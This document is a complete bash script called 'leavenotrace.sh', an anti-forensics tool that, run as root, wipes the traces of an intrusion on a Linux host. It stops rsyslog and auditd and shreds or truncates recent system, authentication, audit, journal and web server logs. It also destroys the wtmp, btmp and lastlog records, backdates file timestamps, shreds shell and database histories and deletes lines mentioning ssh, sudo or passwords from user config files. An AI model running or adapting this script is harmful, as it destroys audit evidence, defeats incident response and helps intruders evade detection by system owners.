#!/bin/bash

show_logo()
{
    clear
    echo -e "$(cat << EOF 

\033[0;32m                                                                           
██     ▄▄▄▄▄  ▄▄▄  ▄▄ ▄▄ ▄▄▄▄▄ ███  ██  ▄▄▄ ██████ ▄▄▄▄   ▄▄▄   ▄▄▄▄ ▄▄▄▄▄ 
██     ██▄▄  ██▀██ ██▄██ ██▄▄  ██ ▀▄██ ██▀██  ██   ██▄█▄ ██▀██ ██▀▀▀ ██▄▄  
██████ ██▄▄▄ ██▀██  ▀█▀  ██▄▄▄ ██   ██ ▀███▀  ██   ██ ██ ██▀██ ▀████ ██▄▄▄\033[0m 
                                                               by infrar3d              
EOF
)"
}

spinner() {
    local spin=('-' '\' '|' '/')
    cycles=5
    for ((cycle=0; cycle<cycles; cycle++)); do
        for i in "${spin[@]}"; do
            echo -ne "\r[$i] Starting clearing..."
            sleep 0.1
        done
    done
    echo ""
}

show_help() {
    echo "leavenotrace.sh [options]"
    echo "Options:"
    echo "  -h | --help Print this message and exit"
    echo "  -u | --username Target username (default is from whoami)"
    echo "  -t | --time Time in minutes"
    echo "  Example:"
    echo "  leavenotrace.sh -u admin -u user1 -t 60 (It will clear logs from admin, user1 and this user)"
}

# logs clear
clean_logs() {
    local time_min=$1
    
    echo "[*] Log cleaning..."
    
    # stop systemctl
    systemctl stop rsyslog auditd 2>/dev/null
    
    # clear text logs
    find /var/log -type f \( -name "*.log" -o -name "messages" -o -name "syslog" -o -name "secure" -o -name "auth.log" -o -name "kern.log" \) \
        -mmin -$time_min -exec sh -c '
            file="{}"
            if [ -f "$file" ]; then
                size=$(stat -c%s "$file" 2>/dev/null || echo 0)
                if [ $size -gt 0 ]; then
                    # Перезаписать случайными данными перед очисткой
                    dd if=/dev/urandom of="$file" bs=1K count=$((size/1024+1)) 2>/dev/null
                    truncate -s 0 "$file"
                    touch -d "2023-01-01" "$file" 2>/dev/null
                fi
            fi
        ' \; 2>/dev/null
    
    # binary logs
    for bin_log in /var/log/{wtmp,btmp,lastlog}; do
        if [ -f "$bin_log" ]; then
            # keep rights and permissions
            local perms=$(stat -c "%a" "$bin_log" 2>/dev/null || echo "600")
            local owner=$(stat -c "%U:%G" "$bin_log" 2>/dev/null || echo "root:root")
            
            # shred and create
            shred -u -z -n 3 "$bin_log" 2>/dev/null
            touch "$bin_log" 2>/dev/null
            chmod $perms "$bin_log" 2>/dev/null
            chown $owner "$bin_log" 2>/dev/null
        fi
    done
    
    # systemd journals
    echo "[*] Cleaning systemd journals..."
    journalctl --vacuum-time=1s --quiet 2>/dev/null
    journalctl --rotate 2>/dev/null
    find /var/log/journal -type f -name "*.journal" -exec shred -u -z -n 2 {} \; 2>/dev/null
    
    # audit logs
    if [ -d /var/log/audit ]; then
        echo "[*] Cleaning audit logs..."
        find /var/log/audit -type f -name "*.log*" -exec sh -c '
            shred -u -z -n 3 "{}" 2>/dev/null || rm -f "{}"
        ' \; 2>/dev/null
    fi
    
    # web-logs with copies
    echo "[*] Cleaning web logs..."
    for web_dir in /var/log/{apache2,nginx,httpd}; do
        if [ -d "$web_dir" ]; then
            find "$web_dir" -type f \( -name "*.log*" -o -name "*.gz" -o -name "*.old" -o -name "*.1" \) \
                -mmin -$time_min -exec shred -u -z -n 2 {} \; 2>/dev/null
        fi
    done
    
    # additional logs
    find /var/log -type f \( -name "*.log.*" -o -name "mail.*" -o -name "*.err" -o -name "*.info" \) \
        -mmin -$time_min -exec sh -c '
            file="{}"
            dd if=/dev/urandom of="$file" bs=1K count=10 2>/dev/null
            shred -u -z -n 2 "$file" 2>/dev/null
        ' \; 2>/dev/null
    
    # start systemctl 
    systemctl start rsyslog 2>/dev/null
}

# clear users' history
clean_user_history() {
    local user=$1
    
    echo "[*] History cleaning for user: $user"
    
    if [ "$user" == "root" ]; then
        home_dir="/root"
    else
        home_dir="/home/$user"
    fi
    
    # check if home dir exists
    if [ ! -d "$home_dir" ]; then
        echo -e "\033[0;31m[-]\033[0m Home directory not found for user: $user"
        return 1
    fi
    
    # clear shell hist
    for hist_file in .bash_history .zsh_history .sh_history .mysql_history .psql_history .python_history .node_repl_history .rediscli_history .sqlite_history; do
        history_file="$home_dir/$hist_file"
        if [ -f "$history_file" ]; then
            # rewrite with random data before remove
            echo "[+] Cleaning: $history_file"
            shred -u -z -n 3 "$history_file" 2>/dev/null || {
                dd if=/dev/urandom of="$history_file" bs=1K count=10 2>/dev/null
                rm -f "$history_file" 2>/dev/null
            }
        fi
    done
    
    # clear conf files
    for config_file in .bashrc .profile .zshrc .viminfo .lesshst .sudo_as_admin_successful .selected_editor; do
        config_path="$home_dir/$config_file"
        if [ -f "$config_path" ]; then
            # remove login history
            sed -i '/ssh\|login\|sudo\|su\|password\|auth/d' "$config_path" 2>/dev/null
            # change timestamps
            touch -d "2020-01-01 00:00:00" "$config_path" 2>/dev/null
        fi
    done
    
    # clear users' cache
    find "$home_dir" -type f \( -name ".*_history" -o -name ".viminfo" -o -name ".lesshst" -o -name ".cache/*" \) \
        -exec sh -c '
            file="{}"
            shred -u -z -n 2 "$file" 2>/dev/null || {
                dd if=/dev/urandom of="$file" bs=1K count=5 2>/dev/null
                rm -f "$file"
            }
        ' \; 2>/dev/null
    
    # clear tmp in home
    find "$home_dir" -type f -name "*.tmp" -o -name "*.temp" -o -name ".*.swp" -o -name ".*.swo" \
        -exec shred -u -z -n 2 {} \; 2>/dev/null
}

# clear tmp data
clean_system_traces() {
    local time_min=$1
    
    echo "[*] Cleaning system temporary files..."
    
    # clear tmp dirs
    for tmp_dir in /tmp /var/tmp /dev/shm; do
        if [ -d "$tmp_dir" ]; then
            find "$tmp_dir" -type f -mmin -$time_min \
                -exec shred -u -z -n 2 {} \; 2>/dev/null
            find "$tmp_dir" -type f -name ".*" -mmin -$time_min \
                -exec shred -u -z -n 2 {} \; 2>/dev/null
        fi
    done
    
    # clear systemd cache
    systemd_journal=/var/log/journal
    if [ -d "$systemd_journal" ]; then
        find "$systemd_journal" -type f -mmin -$time_min \
            -exec shred -u -z -n 2 {} \; 2>/dev/null
    fi
}

# clear memory traces
clean_memory_traces() {
    echo "[*] Cleaning memory traces..."
    
    # clear system cache
    sync
    echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
    
    # clear swap
    if [ -f /proc/swaps ] && grep -q swap /proc/swaps; then
        echo "[*] Cleaning swap space..."
        swapoff -a 2>/dev/null && swapon -a 2>/dev/null
    fi
}

# clear current session and processes
clean_current_session() {
    echo "[*] Cleaning current session..."
    
    # clear current session
    history -c 2>/dev/null
    history -w 2>/dev/null
    
    # clear files of the user
    for hist_file in ~/.bash_history ~/.zsh_history ~/.sh_history; do
        [ -f "$hist_file" ] && shred -u -z -n 3 "$hist_file" 2>/dev/null
    done
    
    # clear var
    unset HISTFILE
    unset HISTSIZE
    unset HISTFILESIZE
    unset HISTCMD
}

USERS=("$(whoami)")
TIME="0"

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_help
            exit 0 
            ;;
        -u|--username)
            USERS+=("$2")
            shift 2
            ;;
        -t|--time)
            TIME="$2"
            shift 2
            ;;
        *)
            show_logo
            echo -e "\033[0;31m[-]\033[0m Unknown parameter $1"
            echo ""
            show_help
            exit 0
            ;;
    esac
done

show_logo

if [ "$TIME" == "0" ]; then
    echo -e "\033[0;31m[-]\033[0m Time can't be 0 min"
    exit 0
else
    if [ "$EUID" -ne 0 ]; then
        echo -e "\033[0;31m[-]\033[0m Need root privileges"
        exit 1
    fi

    spinner
    
    # clear sys logs
    clean_logs "$TIME"
    
    # clear users' history
    for user in "${USERS[@]}"; do
        clean_user_history "$user"
    done
    
    # clear temp files
    clean_system_traces "$TIME"
    
    # clear memory traces
    clean_memory_traces
    
    # clear current session
    clean_current_session
    
    # final sync
    sync
    
    echo -e "\033[0;32m[✓] Advanced clearing completed\033[0m"
    echo -e "\033[0;33m[!] Note: Some traces may still exist in memory or remote logging systems\033[0m"
fi